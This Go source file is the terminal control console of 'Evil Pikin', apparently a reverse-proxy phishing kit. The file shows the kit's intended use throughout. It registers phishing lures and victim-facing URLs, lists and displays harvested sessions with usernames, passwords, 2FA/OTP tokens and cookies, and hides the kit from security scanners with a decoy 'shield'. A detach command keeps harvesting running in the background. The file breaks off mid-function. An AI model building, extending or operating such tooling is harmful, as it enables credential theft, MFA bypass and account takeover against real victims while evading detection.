// Package tui implements the Evil Pikin v1.0 terminal control cockpit: a
// dual-pane, ANSI-themed BubbleTea application divided into a fixed header
// banner, a left interactive command shell, and a right real-time telemetry
// stream. It is engineered for remote SSH sessions on Linux VPS instances: it
// is fully SIGWINCH-driven (BubbleTea handles terminal resize natively) and
// renders with fixed box-drawing borders so layout never tears on resize.
package tui

import (
	"fmt"
	"net"
	"strings"

	"github.com/charmbracelet/bubbles/textinput"
	"github.com/charmbracelet/bubbles/viewport"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/pkg/lures"
)

// ANSI cybersecurity palette. Standard terminal colors are used (not truecolor)
// so the UI stays crisp over constrained SSH configurations.
var (
	colGreen   = lipgloss.Color("2")  // primary accents / logo
	colCyan    = lipgloss.Color("6")  // secondary accents / prompt
	colYellow  = lipgloss.Color("11") // status notifications / DNS sync
	colRed     = lipgloss.Color("1")  // high-value alerts: credentials
	colMagenta = lipgloss.Color("5")  // high-value alerts: cookies
	colWhite   = lipgloss.Color("15")
	colGray    = lipgloss.Color("245")
	colBorder  = lipgloss.Color("6")
)

var (
	titleStyle = lipgloss.NewStyle().Foreground(colGreen).Bold(true)
	accentStyle = lipgloss.NewStyle().Foreground(colCyan)
	statusStyle = lipgloss.NewStyle().Foreground(colYellow)
	alertCredStyle = lipgloss.NewStyle().Foreground(colRed).Bold(true)
	alertCookieStyle = lipgloss.NewStyle().Foreground(colMagenta)
	mutedStyle = lipgloss.NewStyle().Foreground(colGray)
	headerBox = lipgloss.NewStyle().
			Border(lipgloss.NormalBorder()).
			BorderForeground(colBorder)
	paneBox = lipgloss.NewStyle().
		Border(lipgloss.NormalBorder()).
		BorderForeground(colCyan)
	telBox = lipgloss.NewStyle().
		Border(lipgloss.NormalBorder()).
		BorderForeground(colMagenta)
)

// logo is the fixed branding banner spelling "EVILPIKIN" in a bold block font.
// It is rendered in the theme accent (bold green) and is only truncated at
// render time on very narrow SSH windows.
var logo = []string{
	"  _______      _____ _     ____ ___ _  _____ _   _ ",
	" | ____\\ \\    / /_ _| |   |  _ \\_ _| |/ /_ _| \\ | |",
	" |  _|  \\ \\  / / | || |   | |_) | || ' / | ||  \\| |",
	" | |___  \\ \\/ /  | || |___|  __/| || . ` \\ | ||  \\| |",
	" |_____|  \\_/   |___|_____|_|  |___|_|\\___|_|\\__|",
}

// Config carries the runtime wiring the cockpit needs. It is deliberately
// decoupled from the engine internals: the cockpit only needs the session
// store, the live log bus (for telemetry), and the operator-facing URLs.
//
// The lure URL is NEVER pre-computed at launch — it is derived on demand from
// the operator's live configuration (an enabled target + base domain), so an
// unconfigured engine prints nothing until the operator sets up a target.
type Config struct {
	Store            *storage.Store
	Version          string
	BaseDomain       string
	InterceptDomains []string
	DashboardURL     string // web monitoring console (always available)
	ListenHTTP       string
	ListenHTTPS      string

	// Optional data-plane control hooks wired by the host binary. The cockpit
	// stays decoupled from console internals by storing plain funcs.
	OnStart     func() (string, error)
	OnStop      func() string
	OnLureAdd   func(path, target, redirect string) (string, error)
	OnLureRemove func(id string) error
	// OnTargetToggle lets the host react to operator enable/disable of a target
	// (e.g. reload the proxy's routing set). When nil the cockpit falls back to
	// Store.SetTargetEnabled directly.
	OnTargetToggle func(id string, enabled bool) error
	// OnDetach signals the host to keep the capture engine running in the
	// background after the cockpit disconnects (operator logout / screen detach).
	OnDetach func()
	// OnScannerShield toggles the live scanner/detector decoy shield.
	OnScannerShield func(enabled bool) error
	// OnScannerShieldStatus reports the shield state and configured CIDRs.
	OnScannerShieldStatus func() (enabled bool, cidrs []string)
	// OnScannerCIDRAdd / OnScannerCIDRClear manage scanner source ranges.
	OnScannerCIDRAdd  func(cidr string) error
	OnScannerCIDRClear func() error
}

// Model is the BubbleTea application state.
type Model struct {
	cfg  Config
	width  int
	height int

	input textinput.Model
	shell viewport.Model // left pane: command output
	tel   viewport.Model // right pane: telemetry stream

	shellBuf string // accumulated shell scrollback
	telBuf   string // accumulated telemetry scrollback

	logCh  <-chan log.BusEntry
	focus  int    // 0 = left shell (typing), 1 = right telemetry (scroll)
	ready  bool
	quit   bool
}

// logMsg wraps a bus entry for the update loop.
type logMsg struct{ e log.BusEntry }

func waitLog(ch <-chan log.BusEntry) tea.Cmd {
	return func() tea.Msg {
		e, ok := <-ch
		if !ok {
			return nil
		}
		return logMsg{e}
	}
}

// NewModel builds the cockpit model and subscribes to the process log bus so
// background proxy captures, credential logs, and cookie extractions stream
// live into the right pane.
func NewModel(cfg Config) Model {
	ti := textinput.New()
	ti.Prompt = accentStyle.Render("evil_pikin > ")
	ti.Placeholder = "type 'help'"
	ti.Focus()
	ti.Width = 60

	ver := cfg.Version
	if ver == "" {
		ver = "dev"
	}
	_ = ver

	return Model{
		cfg:   cfg,
		input: ti,
		shell: viewport.New(0, 0),
		tel:   viewport.New(0, 0),
		logCh: log.DefaultBus.Subscribe(),
		focus: 0,
	}
}

// Init starts the blink cursor and the telemetry listener.
func (m Model) Init() tea.Cmd {
	return tea.Batch(textinput.Blink, waitLog(m.logCh))
}

// Update is the BubbleTea message loop. All terminal resizing is handled by
// BubbleTea's WindowSizeMsg, keeping the grid stable over SSH.
func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.Type {
		case tea.KeyCtrlC:
			m.quit = true
			return m, tea.Quit
		case tea.KeyTab:
			m.focus = 1 - m.focus
			return m, nil
		case tea.KeyEnter:
			line := strings.TrimSpace(m.input.Value())
			m.input.SetValue("")
			m.echoCommand(line)
			quit := m.runCommand(line)
			m.shell.GotoBottom()
			if quit {
				m.quit = true
				return m, tea.Quit
			}
			return m, nil
		}
		// When focus is on the shell pane, let PageUp/PageDown (and arrows when
		// the input is empty) scroll the backlog instead of moving the cursor, so
		// older output is always reachable. The header stays fixed.
		if m.focus == 0 {
			switch msg.Type {
			case tea.KeyPgUp:
				m.shell.HalfViewUp()
				return m, nil
			case tea.KeyPgDown:
				m.shell.HalfViewDown()
				return m, nil
			case tea.KeyUp:
				if m.input.Value() == "" {
					m.shell.LineUp(1)
					return m, nil
				}
			case tea.KeyDown:
				if m.input.Value() == "" {
					m.shell.LineDown(1)
					return m, nil
				}
			}
		}
		// When focus is on the telemetry pane, let arrows/page scroll it
		// instead of feeding keystrokes to the prompt.
		if m.focus == 1 {
			switch msg.Type {
			case tea.KeyUp:
				m.tel.LineUp(1)
				return m, nil
			case tea.KeyDown:
				m.tel.LineDown(1)
				return m, nil
			case tea.KeyPgUp:
				m.tel.HalfViewUp()
				return m, nil
			case tea.KeyPgDown:
				m.tel.HalfViewDown()
				return m, nil
			}
		}
	case logMsg:
		m.appendTelemetry(msg.e)
		return m, waitLog(m.logCh)
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		m.layout()
		return m, nil
	}

	var cmd tea.Cmd
	m.input, cmd = m.input.Update(msg)
	return m, cmd
}

// layout recomputes the dual-pane grid from the current terminal size. Called
// on every resize, so anomalies never persist.
func (m *Model) layout() {
	if m.width == 0 || m.height == 0 {
		return
	}
	// Size the header to its actual rendered height so it can never be clipped
	// (auto-sized box) and the body pane starts exactly below it. The input line
	// (1 row) is reserved too, so the whole UI never exceeds the terminal height
	// (which would otherwise scroll the top of the banner out of view).
	hdr := headerBox.Width(m.width).Render(m.headerInner())
	headerH := strings.Count(hdr, "\n") + 1
	bodyH := m.height - headerH - 3
	if bodyH < 4 {
		bodyH = 4
	}
	if bodyH < 6 {
		bodyH = 6
	}
	leftW := int(float64(m.width) * 0.46)
	rightW := m.width - leftW
	if leftW < 30 {
		leftW = 30
		rightW = m.width - leftW
	}
	// inner pane heights exclude the 1-char border on each side
	m.shell.Width = leftW - 2
	m.shell.Height = bodyH - 2
	m.tel.Width = rightW - 2
	m.tel.Height = bodyH - 2
	m.input.Width = leftW - 4
	m.ready = true
}

func (m *Model) echoCommand(line string) {
	if line == "" {
		m.shellBuf += accentStyle.Render("evil_pikin > ") + "\n"
	} else {
		m.shellBuf += accentStyle.Render("evil_pikin > ") + line + "\n"
	}
	m.shell.SetContent(m.shellBuf)
}

func (m *Model) appendShell(s string) {
	m.shellBuf += s + "\n"
	m.shell.SetContent(m.shellBuf)
}

func (m *Model) appendTelemetry(e log.BusEntry) {
	line := formatLog(e)
	m.telBuf += line + "\n"
	// cap history to keep memory bounded on long sessions
	if lines := strings.Count(m.telBuf, "\n"); lines > 2000 {
		if idx := strings.Index(m.telBuf, "\n"); idx > 0 {
			m.telBuf = m.telBuf[idx+1:]
		}
	}
	m.tel.SetContent(m.telBuf)
	m.tel.GotoBottom()
}

// formatLog color-codes a bus entry: yellow for status/DNS, red/magenta for
// credential & cookie events, gray for routine noise.
func formatLog(e log.BusEntry) string {
	ts := e.Time.Format("15:04:05")
	stamp := mutedStyle.Render("[" + ts + "] ")
	msg := e.Message
	low := strings.ToLower(msg)
	switch {
	case strings.Contains(low, "password") || strings.Contains(low, "credential") ||
		strings.Contains(low, "2fa") || strings.Contains(low, "otp") ||
		strings.Contains(low, "email") || strings.Contains(low, "victim"):
		return stamp + alertCredStyle.Render(msg)
	case strings.Contains(low, "cookie") || strings.Contains(low, "authorization") ||
		strings.Contains(low, "token"):
		return stamp + alertCookieStyle.Render(msg)
	case e.Level == "imp" || strings.Contains(low, "dns") || strings.Contains(low, "sync") ||
		strings.Contains(low, "intercept"):
		return stamp + statusStyle.Render(msg)
	default:
		return stamp + mutedStyle.Render(msg)
	}
}

// runCommand dispatches the operator control statements. Returns true to quit.
func (m *Model) runCommand(line string) bool {
	if line == "" {
		return false
	}
	fields := strings.Fields(line)
	cmd := fields[0]
	args := fields[1:]

	switch cmd {
	case "help":
		m.appendShell(m.helpText(args))
	case "target", "targets":
		m.handleTargets(args)
	case "clear":
		m.shellBuf = ""
		m.shell.SetContent("")
	case "start":
		if m.cfg.OnStart != nil {
			msg, err := m.cfg.OnStart()
			if err != nil {
				m.appendShell(alertCredStyle.Render("start failed: " + err.Error()))
				return false
			}
			m.appendShell(statusStyle.Render(msg))
		} else {
			m.appendShell(mutedStyle.Render("data plane control not available"))
		}
	case "stop":
		if m.cfg.OnStop != nil {
			m.appendShell(statusStyle.Render(m.cfg.OnStop()))
		} else {
			m.appendShell(mutedStyle.Render("data plane control not available"))
		}
	case "dashboard":
		if m.cfg.DashboardURL == "" {
			m.appendShell(mutedStyle.Render("web monitoring console not configured"))
			break
		}
		m.appendShell(accentStyle.Render("Web Monitoring Console: ") + m.cfg.DashboardURL)
		m.appendShell(mutedStyle.Render("Per-target dashboards (each lure's harvest lands in its target board):"))
		if m.cfg.Store != nil {
			if ts, err := m.cfg.Store.ListTargets(); err == nil {
				for _, t := range ts {
					m.appendShell(statusStyle.Render("  [" + t.ID + "] " + t.Name + "  ->  " + m.dashboardURLForTarget(t.ID)))
				}
			}
		}
		if lure := m.deriveLureURL(); lure != "" {
			m.appendShell(accentStyle.Render("Primary Lure URL:         ") + lure)
		} else {
			m.appendShell(mutedStyle.Render("Primary Lure URL:         (configure a target to generate)"))
		}
	case "config":
		if len(args) == 0 || args[0] != "show" {
			m.appendShell(mutedStyle.Render("usage: config show"))
			return false
		}
		m.appendShell(m.configShow())
	case "lures":
		m.listLures()
	case "lure":
		m.handleLure(args)
	case "sessions":
		if len(args) == 0 {
			m.appendShell(mutedStyle.Render("usage: sessions list | sessions view <ID>"))
			return false
		}
		switch args[0] {
		case "list":
			m.appendShell(m.sessionsList())
		case "view":
			if len(args) < 2 {
				m.appendShell(mutedStyle.Render("usage: sessions view <ID>"))
				return false
			}
			m.appendShell(m.sessionsView(args[1]))
		default:
			m.appendShell(mutedStyle.Render("unknown sessions subcommand: " + args[0]))
		}
	case "detach":
		if m.cfg.OnDetach != nil {
			m.cfg.OnDetach()
		}
		m.appendShell(statusStyle.Render("cockpit detached — engine continues harvesting in the background"))
		return true
	case "exit", "quit":
		return true
	default:
		m.appendShell(mutedStyle.Render("unknown command: " + cmd + "  (type 'help')"))
	}
	return false
}

func (m *Model) helpText(topics []string) string {
	if len(topics) > 0 {
		switch topics[0] {
		case "lure", "lures":
			return m.lureHelp()
		case "config":
			return m.configHelp()
		case "target", "targets":
			return m.targetsHelp()
		case "session", "sessions":
			return m.sessionsHelp()
		}
	}
	return m.fullHelp()
}

func (m *Model) fullHelp() string {
	return titleStyle.Render("Evil Pikin — Operator Commands") + "\n" +
		accentStyle.Render("  help") + "                 this message (use 'help <topic>' for groups)\n" +
		accentStyle.Render("  help lure") + "            all lure commands\n" +
		accentStyle.Render("  help config") + "          all config commands\n" +
		accentStyle.Render("  help targets") + "         all target commands\n" +
		accentStyle.Render("  help sessions") + "        all session commands\n" +
		accentStyle.Render("  config show") + "          operational domains + active targets\n" +
		accentStyle.Render("  sessions list") + "        ASCII table of harvested sessions\n" +
		accentStyle.Render("  sessions view <ID>") + "    detailed capture (email/password/token)\n" +
		accentStyle.Render("  lures / lure list") + "     list registered phishing lures\n" +
		accentStyle.Render("  lure add <path> <target> [redirect]") + "  register a tracked lure\n" +
		accentStyle.Render("  lure get-lure <id>") + "    print the victim-facing URL for a lure\n" +
		accentStyle.Render("  lure rm <id>") + "          remove a lure\n" +
		accentStyle.Render("  targets / target list") + " list configured targets + enabled state\n" +
		accentStyle.Render("  target enable <id>") + "     enable a target (activate routing)\n" +
		accentStyle.Render("  target disable <id>") + "    disable a target (stop routing)\n" +
		accentStyle.Render("  dashboard") + "            print the web monitoring URL per target\n" +
		accentStyle.Render("  start / stop") + "        bring the proxy data plane up / down\n" +
		accentStyle.Render("  detach") + "             leave the cockpit but keep harvesting in the background\n" +
		accentStyle.Render("  clear") + "              clear this shell pane\n" +
		accentStyle.Render("  exit / quit") + "        leave the cockpit\n" +
		mutedStyle.Render("  TAB toggles scroll focus between shell and telemetry panes.")
}

func (m *Model) lureHelp() string {
	return titleStyle.Render("Lure commands") + "\n" +
		accentStyle.Render("  lures / lure list") + "          list registered lures + victim URLs\n" +
		accentStyle.Render("  lure add <path> <target> [redirect]") + "  register a tracked lure\n" +
		accentStyle.Render("  lure get-lure <id>") + "        print the victim-facing URL for a lure\n" +
		accentStyle.Render("  lure rm <id>") + "              remove a lure\n" +
		accentStyle.Render("  lure shield [on|off|status]") + "  hide the kit from crawlers/bots (decoy)\n" +
		accentStyle.Render("  lure shield cidr add <cidr>") + " block a scanner source range\n"
}

func (m *Model) configHelp() string {
	return titleStyle.Render("Config commands") + "\n" +
		accentStyle.Render("  config show") + "          operational domains + active targets\n"
}

func (m *Model) targetsHelp() string {
	return titleStyle.Render("Target commands") + "\n" +
		accentStyle.Render("  targets / target list") + "   list configured targets + enabled state\n" +
		accentStyle.Render("  target enable <id>") + "     enable a target (activate routing)\n" +
		accentStyle.Render("  target disable <id>") + "    disable a target (stop routing)\n"
}

func (m *Model) sessionsHelp() string {
	return titleStyle.Render("Session commands") + "\n" +
		accentStyle.Render("  sessions list") + "         ASCII table of harvested sessions\n" +
		accentStyle.Render("  sessions view <ID>") + "     detailed capture (email/password/token)\n"
}

func (m *Model) configShow() string {
	var b strings.Builder
	b.WriteString(titleStyle.Render("Operational Configuration") + "\n")
	b.WriteString(accentStyle.Render("  Base Domain     : ") + m.cfg.BaseDomain + "\n")
	b.WriteString(accentStyle.Render("  Listen (http)   : ") + nonzero(m.cfg.ListenHTTP, "n/a") + "\n")
	b.WriteString(accentStyle.Render("  Listen (https)  : ") + nonzero(m.cfg.ListenHTTPS, "n/a") + "\n")
	b.WriteString(accentStyle.Render("  Dashboard URL   : ") + nonzero(m.cfg.DashboardURL, "n/a") + "\n")
	if lure := m.deriveLureURL(); lure != "" {
		b.WriteString(accentStyle.Render("  Lure URL        : ") + lure + "\n")
	} else {
		b.WriteString(accentStyle.Render("  Lure URL        : ") + mutedStyle.Render("(configure a target to generate)") + "\n")
	}
	b.WriteString(accentStyle.Render("  Intercept Domains:") + "\n")
	for _, d := range m.cfg.InterceptDomains {
		b.WriteString("    - " + d + "\n")
	}
	if m.cfg.Store != nil {
		if ts, err := m.cfg.Store.ListTargets(); err == nil {
			b.WriteString(accentStyle.Render("  Active Targets:") + "\n")
			for _, t := range ts {
				state := mutedStyle.Render("disabled")
				if t.Enabled {
					state = statusStyle.Render("ENABLED")
				}
				b.WriteString("    [" + state + "] " + t.Name + "  (" + nonzero(t.ProxyHost, t.Origin) + ")\n")
			}
		}
	}
	return b.String()
}

func (m *Model) sessionsList() string {
	if m.cfg.Store == nil {
		return mutedStyle.Render("store unavailable")
	}
	sessions, err := m.cfg.Store.ListSessions("", "")
	if err != nil {
		return alertCredStyle.Render("error: " + err.Error())
	}
	if len(sessions) == 0 {
		return mutedStyle.Render("no sessions harvested yet")
	}
	base := []int{18, 18, 22, 10, 5}
	widths := clampTableWidths(base, m.shell.Width)
	rows := make([][]string, 0, len(sessions))
	for _, s := range sessions {
		valid := "no"
		if s.IsValid {
			valid = "YES"
		}
		rows = append(rows, []string{
			truncate(s.ID, widths[0]),
			truncate(s.TargetName, widths[1]),
			truncate(s.Username, widths[2]),
			truncate(string(s.FlowType), widths[3]),
			valid,
		})
	}
	table := asciiTable(
		[]string{"SESSION ID", "TARGET", "USERNAME", "FLOW", "VALID"},
		rows,
		widths,
	)
	return titleStyle.Render(fmt.Sprintf("Harvested Sessions (%d)", len(sessions))) + "\n" + table
}

func (m *Model) sessionsView(id string) string {
	if m.cfg.Store == nil {
		return mutedStyle.Render("store unavailable")
	}
	s, err := m.cfg.Store.GetSession(id)
	if err != nil {
		return alertCredStyle.Render("session not found: " + id)
	}
	var b strings.Builder
	b.WriteString(titleStyle.Render("Session Detail — " + s.ID) + "\n")
	b.WriteString(alertCredStyle.Render("  Email / User : ") + s.Username + "\n")
	b.WriteString(alertCredStyle.Render("  Password    : ") + s.Password + "\n")
	b.WriteString(alertCookieStyle.Render("  2FA / OTP   : ") + s.OTPToken + "\n")
	b.WriteString(accentStyle.Render("  Flow Type   : ") + string(s.FlowType) + "\n")
	b.WriteString(accentStyle.Render("  Target      : ") + s.TargetName + "\n")
	b.WriteString(accentStyle.Render("  Remote      : ") + s.RemoteAddr + "\n")
	b.WriteString(accentStyle.Render("  Status      : ") + s.Status + "\n")

	cookieNames := make([]string, 0)
	for name := range s.Cookies {
		cookieNames = append(cookieNames, name)
	}
	b.WriteString(alertCookieStyle.Render(fmt.Sprintf("  Cookies (%d)  : ", len(cookieNames))) + strings.Join(cookieNames, ", ") + "\n")

	if len(s.Custom) > 0 {
		b.WriteString(accentStyle.Render("  Reset Payload:") + "\n")
		for k, v := range s.Custom {
			b.WriteString("    " + k + " = " + v + "\n")
		}
	}

	if len(s.TelemetryLog) > 0 {
		b.WriteString(mutedStyle.Render("  Telemetry Log:") + "\n")
		for _, l := range s.TelemetryLog {
			b.WriteString("    " + l + "\n")
		}
	}
	return b.String()
}

// deriveLureURL computes the operator's phishing/lure entry point from the
// live configuration: the first ENABLED target's proxy host combined with the
// public HTTPS listener. It returns "" until a target is actually configured,
// so an unconfigured engine never advertises a phantom lure.
func (m *Model) handleLure(args []string) {
	if len(args) == 0 {
		m.listLures()
		return
	}
	switch args[0] {
	case "list":
		m.listLures()
	case "add":
		m.addLure(args[1:])
	case "get-lure", "get":
		m.getLure(args[1:])
	case "rm", "remove", "delete":
		m.removeLure(args[1:])
	case "shield":
		m.handleShield(args[1:])
	default:
		m.appendShell(mutedStyle.Render("usage: lure list | lure add <path> <target> [redirect] | lure get-lure <id> | lure rm <id> | lure shield [on|off|status|cidr ...]"))
	}
}

func (m *Model) handleShield(args []string) {
	if len(args) == 0 || args[0] == "status" {
		if m.cfg.OnScannerShieldStatus != nil {
			enabled, cidrs := m.cfg.OnScannerShieldStatus()
			label, st := "DISABLED", mutedStyle
			if enabled {
				label, st = "ENABLED", lipgloss.NewStyle().Foreground(colGreen).Bold(true)
			}
			m.appendShell(st.Render("scanner shield: " + label))
			if len(cidrs) == 0 {
				m.appendShell(mutedStyle.Render("scanner CIDRs: (none)"))
			} else {
				m.appendShell(mutedStyle.Render("scanner CIDRs:"))
				for _, c := range cidrs {
					m.appendShell(mutedStyle.Render("  - " + c))
				}
			}
			return
		}
		m.appendShell(mutedStyle.Render("scanner shield status unavailable"))
		return
	}
	switch args[0] {
	case "on":
		if m.cfg.OnScannerShield != nil {
			if err := m.cfg.OnScannerShield(true); err != nil {
				m.appendShell(alertCredStyle.Render("shield failed: " + err.Error()))
				return
			}
		}
		m.appendShell(lipgloss.NewStyle().Foreground(colGreen).Bold(true).
			Render("scanner shield ENABLED — crawlers/bots get a benign decoy, real victims get the kit"))
	case "off":
		if m.cfg.OnScannerShield != nil {
			if err := m.cfg.OnScannerShield(false); err != nil {
				m.appendShell(alertCredStyle.Render("shield failed: " + err.Error()))
				return
			}
		}
		m.appendShell(mutedStyle.Render("scanner shield DISABLED"))
	case "cidr":
		if len(args) < 2 {
			m.appendShell(mutedStyle.Render("usage: lure shield cidr add <cidr> | lure shield cidr clear"))
			return
		}
		switch args[1] {
		case "add":
			if len(args) < 3 {
				m.appendShell(mutedStyle.Render("usage: lure shield cidr add <cidr>"))
				return
			}
			if m.cfg.OnScannerCIDRAdd != nil {
				if err := m.cfg.OnScannerCIDRAdd(args[2]); err != nil {
					m.appendShell(alertCredStyle.Render("cidr add failed: " + err.Error()))
					return
				}
			}
			m.appendShell(statusStyle.Render("scanner CIDR added: " + args[2]))
		case "clear":
			if m.cfg.OnScannerCIDRClear != nil {
				m.cfg.OnScannerCIDRClear()
			}
			m.appendShell(statusStyle.Render("scanner CIDRs cleared"))
		default:
			m.appendShell(mutedStyle.Render("usage: lure shield cidr add <cidr> | lure shield cidr clear"))
		}
	default:
		m.appendShell(mutedStyle.Render("usage: lure shield [on|off|status|cidr ...]"))
	}
}

func (m *Model) listLures() {
	if m.cfg.Store == nil {
		m.appendShell(mutedStyle.Render("store unavailable"))
		return
	}
	ls, err := m.cfg.Store.ListLures()
	if err != nil {
		m.appendShell(alertCredStyle.Render("error: " + err.Error()))
		return
	}
	if len(ls) == 0 {
		m.appendShell(mutedStyle.Render("no lures registered"))
		return
	}
	rows := make([][]string, 0, len(ls))
	for _, l := range ls {
		active := "no"
		if l.IsActive {
			active = "YES"
		}
		rows = append(rows, []string{
			truncate(l.ID, 16),
			truncate("/"+l.Path, 24),
			truncate(l.TargetProfile, 20),
			truncate(l.RedirectURL, 22),
			active,
		})
	}
	table := asciiTable(
		[]string{"ID", "PATH", "TARGET", "REDIRECT", "ACTIVE"},
		rows,
		[]int{16, 24, 20, 22, 5},
	)
	m.appendShell(titleStyle.Render(fmt.Sprintf("Registered Lures (%d)", len(ls))) + "\n" + table)
}

func (m *Model) addLure(args []string) {
	if len(args) < 2 {
		m.appendShell(mutedStyle.Render("usage: lure add <path> <target> [redirect]"))
		return
	}
	path, target := args[0], args[1]
	redirect := ""
	if len(args) > 2 {
		redirect = args[2]
	}
	if m.cfg.OnLureAdd == nil {
		m.appendShell(mutedStyle.Render("lure control not wired"))
		return
	}
	msg, err := m.cfg.OnLureAdd(path, target, redirect)
	if err != nil {
		m.appendShell(alertCredStyle.Render("lure add failed: " + err.Error()))
		return
	}
	m.appendShell(statusStyle.Render(msg))
}

func (m *Model) removeLure(args []string) {
	if len(args) < 1 {
		m.appendShell(mutedStyle.Render("usage: lure rm <id>"))
		return
	}
	id := args[0]
	if m.cfg.OnLureRemove == nil {
		if m.cfg.Store != nil {
			_ = m.cfg.Store.DeleteLure(id)
		}
		m.appendShell(statusStyle.Render("lure " + id + " removed (store)"))
		return
	}
	if err := m.cfg.OnLureRemove(id); err != nil {
		m.appendShell(alertCredStyle.Render("lure rm failed: " + err.Error()))
		return
	}
	m.appendShell(statusStyle.Render("lure " + id + " removed"))
}

func (m *Model) getLure(args []string) {
	if len(args) < 1 {
		m.appendShell(mutedStyle.Render("usage: lure get-lure <id>"))
		return
	}
	id := args[0]
	if m.cfg.Store == nil {
		m.appendShell(mutedStyle.Render("store unavailable"))
		return
	}
	l, err := m.cfg.Store.GetLure(id)
	if err != nil || l == nil {
		m.appendShell(alertCredStyle.Render("lure not found: " + id))
		return
	}
	url := m.lureURLForLure(l)
	state := "no"
	if l.IsActive {
		state = "YES"
	}
	m.appendShell(titleStyle.Render("Lure #" + l.ID))
	m.appendShell(accentStyle.Render("  URL    : ") + url)
	m.appendShell(mutedStyle.Render("  Path   : /" + l.Path + "   Target: " + l.TargetProfile + "   Active: " + state))
}

func (m *Model) lureURLForLure(l *lures.Lure) string {
	host := l.TargetProfile
	if host == "" {
		host = m.cfg.BaseDomain
	}
	if _, p, err := net.SplitHostPort(m.cfg.ListenHTTPS); err == nil && p != "" && p != "443" {
		if _, _, herr := net.SplitHostPort(host); herr != nil {
			host = net.JoinHostPort(host, p)
		}
	}
	return l.TrackingURL("https://"+host, "")
}

func (m *Model) handleTargets(args []string) {
	if len(args) == 0 {
		m.listTargets()
		return
	}
	switch args[0] {
	case "list":
		m.listTargets()
	case "enable":
		m.setTargetEnabled(args[1:], true)
	case "disable":
		m.setTargetEnabled(args[1:], false)
	default:
		m.appendShell(mutedStyle.Render("usage: targets list | target enable <id> | target disable <id>"))
	}
}

func (m *Model) listTargets() {
	if m.cfg.Store == nil {
		m.appendShell(mutedStyle.Render("store unavailable"))
		return
	}
	ts, err := m.cfg.Store.ListTargets()
	if err != nil {
		m.appendShell(alertCredStyle.Render("error: " + err.Error()))
		return
	}
	if len(ts) == 0 {
		m.appendShell(mutedStyle.Render("no targets configured"))
		return
	}
	base := []int{16, 24, 28, 8}
	widths := clampTableWidths(base, m.shell.Width)
	rows := make([][]string, 0, len(ts))
	for _, t := range ts {
		state := "disabled"
		if t.Enabled {
			state = "ENABLED"
		}
		rows = append(rows, []string{truncate(t.ID, widths[0]), truncate(t.Name, widths[1]), truncate(t.ProxyHost, widths[2]), state})
	}
	table := asciiTable([]string{"ID", "NAME", "PROXY HOST", "STATE"}, rows, widths)
	greenState := lipgloss.NewStyle().Foreground(colGreen).Bold(true)
	table = strings.ReplaceAll(table, "ENABLED", greenState.Render("ENABLED"))
	table = strings.ReplaceAll(table, "disabled", mutedStyle.Render("disabled"))
	m.appendShell(titleStyle.Render(fmt.Sprintf("Configured Targets (%d)", len(ts))) + "\n" + table)
}

func (m *Model) setTargetEnabled(args []string, enabled bool) {
	if len(args) < 1 {
		m.appendShell(mutedStyle.Render("usage: target enable <id> | target disable <id>"))
		return
	}
	id := args[0]
	if m.cfg.OnTargetToggle == nil && m.cfg.Store == nil {
		m.appendShell(mutedStyle.Render("store unavailable"))
		return
	}
	if m.cfg.OnTargetToggle != nil {
		if err := m.cfg.OnTargetToggle(id, enabled); err != nil {
			m.appendShell(alertCredStyle.Render("target toggle failed: " + err.Error()))
			return
		}
	} else if err := m.cfg.Store.SetTargetEnabled(id, enabled); err != nil {
		m.appendShell(alertCredStyle.Render("target toggle failed: " + err.Error()))
		return
	}
	verb := "disabled"
	st := mutedStyle
	if enabled {
		verb = "ENABLED"
		st = lipgloss.NewStyle().Foreground(colGreen).Bold(true)
	}
	m.appendShell(st.Render(fmt.Sprintf("target %s -> %s", id, verb)))
}

func (m Model) deriveLureURL() string {
	if m.cfg.Store == nil {
		return ""
	}
	ts, err := m.cfg.Store.ListTargets()
	if err != nil {
		return ""
	}
	for _, t := range ts {
		if !t.Enabled {
			continue
		}
		host := t.ProxyHost
		if host == "" && len(t.RoutingMatrix) > 0 {
			host = t.RoutingMatrix[0].ProxyHost
		}
		if host == "" {
			continue
		}
		return "https://" + host + portSuffix(m.cfg.ListenHTTPS)
	}
	return ""
}

func portSuffix(addr string) string {
	if addr == "" {
		return ""
	}
	if idx := strings.LastIndex(addr, ":"); idx >= 0 {
		p := addr[idx+1:]
		if p == "" || p == "443" {
			return ""
		}
		return ":" + p
	}
	return ""
}

// dashboardURLForTarget returns the per-target monitoring dashboard URL. Each
// target gets its own board (filter by target_id) so multiple targets can be
// harvested from one VPS/terminal without their sessions mixing.
func (m Model) dashboardURLForTarget(id string) string {
	base := strings.TrimSuffix(m.cfg.DashboardURL, "/")
	return base + "/?target=" + id
}

// View renders the three-region grid.
func (m Model) View() string {
	if !m.ready {
		return mutedStyle.Render("initializing Evil Pikin cockpit...")
	}
	header := headerBox.Width(m.width).Render(m.headerInner())
	left := paneBox.Width(m.shell.Width + 2).Height(m.shell.Height + 2).
		Render(m.shell.View())
	right := telBox.Width(m.tel.Width + 2).Height(m.tel.Height + 2).
		Render(m.tel.View())
	body := lipgloss.JoinHorizontal(lipgloss.Top, left, right)
	inputLine := m.input.View()
	return lipgloss.JoinVertical(lipgloss.Left, header, body, inputLine)
}

func (m Model) headerInner() string {
	var b strings.Builder
	for _, l := range logo {
		b.WriteString(titleStyle.Render(truncate(l, m.width-4)) + "\n")
	}
	// stats line
	stats := titleStyle.Render("Evil Pikin v" + nonzero(m.cfg.Version, "1.0"))
	if m.cfg.BaseDomain != "" {
		stats += statusStyle.Render("   base: " + m.cfg.BaseDomain)
	}
	if m.cfg.DashboardURL != "" {
		stats += statusStyle.Render("   monitor: " + m.cfg.DashboardURL)
	}
	if m.cfg.Store != nil {
		if s, err := m.cfg.Store.ListSessions("", ""); err == nil {
			stats += accentStyle.Render(fmt.Sprintf("   sessions: %d", len(s)))
		}
	}
	b.WriteString(truncate(stats, m.width-4) + "\n")
	focus := "shell"
	if m.focus == 1 {
		focus = "telemetry"
	}
	hint := mutedStyle.Render("TAB:focus=" + focus + "   type 'help' for commands")
	b.WriteString(truncate(hint, m.width-4))
	return b.String()
}

func nonzero(s, fallback string) string {
	if s == "" {
		return fallback
	}
	return s
}

func truncate(s string, n int) string {
